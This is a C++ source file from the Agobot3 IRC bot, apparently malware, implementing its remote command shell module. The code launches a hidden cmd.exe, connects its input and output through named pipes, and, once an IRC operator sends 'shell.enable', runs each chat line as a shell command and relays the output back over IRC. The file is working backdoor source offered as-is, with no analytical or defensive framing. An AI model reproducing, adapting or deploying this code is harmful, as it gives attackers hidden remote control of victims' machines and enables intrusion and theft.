/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "cmdshell.h"
#include "cthread.h"

#ifdef _WIN32

CStdOut_Listen::CStdOut_Listen() { }
CStdOut_Listen::~CStdOut_Listen() { }

void *CStdOut_Listen::Run()
{	DWORD dwRead, dwAvail=0; CString sRecvQueue(""); char recvbuf[1024]; int iSendBufIndex=0;
	while(m_bRunning) {
		while(!m_pCmdShell->m_bEnabled) Sleep(1000);
		memset(recvbuf, 0, sizeof(recvbuf));
		if(!PeekNamedPipe(m_hStdOut, NULL, 0, NULL, &dwAvail, NULL)) break;
		if(!dwAvail) { Sleep(200); continue; }
		if(!ReadFile(m_hStdOut, recvbuf, min(1022, dwAvail), &dwRead, NULL)) break;
		if(!dwRead)  { Sleep(200); continue; }
		recvbuf[dwRead]='\x00'; sRecvQueue.Append(recvbuf);

		if(	sRecvQueue.operator [](sRecvQueue.GetLength()-1)=='>' ||
			sRecvQueue.operator [](sRecvQueue.GetLength()-2)=='>' ||
			sRecvQueue.operator [](sRecvQueue.GetLength()-1)==':') {
			// Its some command prompt, send now
			m_pMessage->pReply->DoReplyF(m_pMessage, "%s", sRecvQueue.CStr());
			Sleep(500); sRecvQueue.Assign(""); }

		if(sRecvQueue.Find("\n")) {
			CString sRest, sData;
			for(int i=sRecvQueue.GetLength(); i; --i)
				if(sRecvQueue.operator [](i)=='\n') {
					sRest=sRecvQueue.Mid(i+1, sRecvQueue.GetLength()-(i+1));
					sData=sRecvQueue.Mid(0, i+1); break; }

			// Process sData, if not empty
			if(sData.Compare("")) {
				CString sToken(sData.Token(0, "\n")); int iTokenIndex=0;
				while(sToken.Compare("")) {
					// Check if the line is equal to last input and skip in that case
					if(!m_pCmdShell->m_sLastInput.Compare(sToken.CStr())) {
						iTokenIndex++; sToken.Assign(sData.Token(iTokenIndex, "\n")); }

					// We got a line to send, send it
					m_pCmdShell->m_mMessage.pReply->DoReply(&m_pCmdShell->m_mMessage, sToken.CStr());

					iTokenIndex++; sToken.Assign(sData.Token(iTokenIndex, "\n")); }
				sData.Assign(""); }

			sRecvQueue.Assign(sRest); }
	}

	return NULL; }

CCmdShell::CCmdShell() {
	m_bEnabled=false; m_pStdErr=NULL; m_pStdOut=NULL;
	m_mMessage.bSilent=true; m_mMessage.bNotice=false; m_mMessage.sReplyTo.Assign("");
	m_sLastInput.Assign("bla"); }

CCmdShell::~CCmdShell() {
	TerminateProcess(m_hProcess, 0);
	// while(WaitForSingleObject(m_hProcess, 0)==WAIT_TIMEOUT && m_pStdOut->IsRunning())
	// { TerminateProcess(m_hProcess, 0); Sleep(1000); }
	if(m_pStdOut && m_pStdErr) {
		m_pStdOut->Kill(); m_pStdErr->Kill();
		CloseHandle(m_hStdOut); CloseHandle(m_hStdErr); CloseHandle(m_hStdIn);
		CloseHandle(m_sinfo.hStdOutput); CloseHandle(m_sinfo.hStdError); CloseHandle(m_sinfo.hStdInput);
	}
}

bool CCmdShell::Init()
{
	if(g_pMainCtrl->m_pBot->bot_cmdshell.bValue) {
		char *command="cmd.exe";

		PROCESS_INFORMATION pinfo; SECURITY_ATTRIBUTES SecAttrib={0}; SECURITY_DESCRIPTOR SecDesc;
		InitializeSecurityDescriptor(&SecDesc, SECURITY_DESCRIPTOR_REVISION); SetSecurityDescriptorDacl(&SecDesc, true, NULL, false);
		
		SecAttrib.nLength=sizeof(SECURITY_ATTRIBUTES); SecAttrib.lpSecurityDescriptor=&SecDesc; SecAttrib.bInheritHandle=true;
		
		memset(&m_sinfo, 0, sizeof(STARTUPINFO));
		m_sinfo.dwFlags		|=	STARTF_USESTDHANDLES;	m_sinfo.hStdOutput	=	INVALID_HANDLE_VALUE;
		m_sinfo.hStdInput	 =	INVALID_HANDLE_VALUE;	m_sinfo.hStdError	=	INVALID_HANDLE_VALUE;
		m_sinfo.cb			 =	sizeof(m_sinfo);		m_sinfo.wShowWindow	=	SW_HIDE;
		char szStdOutPipe[MAX_PATH]=""; char szStdInPipe[MAX_PATH]=""; char szStdErrPipe[MAX_PATH]="";
		sprintf(szStdOutPipe, "\\\\.\\pipe\\exec-%s-stdout", command); sprintf(szStdInPipe, "\\\\.\\pipe\\exec-%s-stdin", command); sprintf(szStdErrPipe, "\\\\.\\pipe\\exec-%s-stderr", command);
		m_sinfo.hStdOutput=CreateNamedPipe(szStdOutPipe, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_MESSAGE|PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, (DWORD)-1, &SecAttrib);
		m_sinfo.hStdInput=CreateNamedPipe(szStdInPipe, PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE|PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, (DWORD)-1, &SecAttrib);
		m_sinfo.hStdError=CreateNamedPipe(szStdErrPipe, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_MESSAGE|PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, (DWORD)-1, &SecAttrib);
		if(m_sinfo.hStdOutput==INVALID_HANDLE_VALUE||m_sinfo.hStdError==INVALID_HANDLE_VALUE||m_sinfo.hStdInput==INVALID_HANDLE_VALUE) {
			CloseHandle(m_sinfo.hStdOutput); CloseHandle(m_sinfo.hStdError); CloseHandle(m_sinfo.hStdInput); return true; }

		m_hStdOut=INVALID_HANDLE_VALUE; m_hStdIn=INVALID_HANDLE_VALUE; m_hStdErr=INVALID_HANDLE_VALUE;
		WaitNamedPipe(szStdOutPipe, NULL); WaitNamedPipe(szStdInPipe, NULL); WaitNamedPipe(szStdErrPipe, NULL);
		m_hStdOut=CreateFile(szStdOutPipe, GENERIC_READ, 0, &SecAttrib, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		m_hStdIn=CreateFile(szStdInPipe, GENERIC_WRITE, 0, &SecAttrib, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		m_hStdErr=CreateFile(szStdErrPipe, GENERIC_READ, 0, &SecAttrib, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if(CreateProcess(NULL, command, NULL, NULL, true, NORMAL_PRIORITY_CLASS|CREATE_NO_WINDOW, NULL, NULL, &m_sinfo, &pinfo))
		{	m_hProcess=pinfo.hProcess; m_pStdOut=new CStdOut_Listen; m_pStdErr=new CStdOut_Listen;
			m_pStdOut->m_pCmdShell=this; m_pStdErr->m_pCmdShell=this;
			m_pStdOut->m_hStdOut=m_hStdOut; m_pStdOut->Start(true, false, false);
			m_pStdErr->m_hStdOut=m_hStdErr; m_pStdErr->Start(true, false, false); }
	}
	return true;
}

bool CCmdShell::HandleCommand(CMessage *pMsg) {
	// Check if were enabled
	if(!g_pMainCtrl->m_pBot->bot_cmdshell.bValue) return false;

	if(!pMsg->sCmd.Compare("shell.enable")) {
		m_bEnabled=true; m_pStdOut->m_pMessage=&m_mMessage;
		m_mMessage=*pMsg; return true; }
	else if(!pMsg->sCmd.Compare("shell.disable")) {
		m_bEnabled=false;
		m_mMessage.sReplyTo.Assign("");
		m_mMessage.bSilent=true; m_mMessage.bNotice=false;
		m_mMessage.bOutchan=false;
		return true; }
	else if(m_bEnabled) {
		// FallBack handler starts here
		m_pStdOut->m_pMessage=&m_mMessage; m_mMessage=*pMsg;
		DWORD dwWritten; m_sLastInput.Format("%s\n", pMsg->sChatString.CStr());
		WriteFile(m_hStdIn, m_sLastInput.CStr(), (DWORD)m_sLastInput.GetLength(), &dwWritten, NULL);
		m_sLastInput.Format("%s", pMsg->sChatString.CStr());
	}

	return false; }

REGOBJ(CCmdShell, g_pCmdShell, true, 5);
REGCMD(m_cmdFallBackHandler,	"shell.handler",		true,	g_pCmdShell);
REGCMD(m_cmdEnable,				"shell.enable",			false,	g_pCmdShell);
REGCMD(m_cmdDisable,			"shell.disable",			false,	g_pCmdShell);

#endif // _WIN32
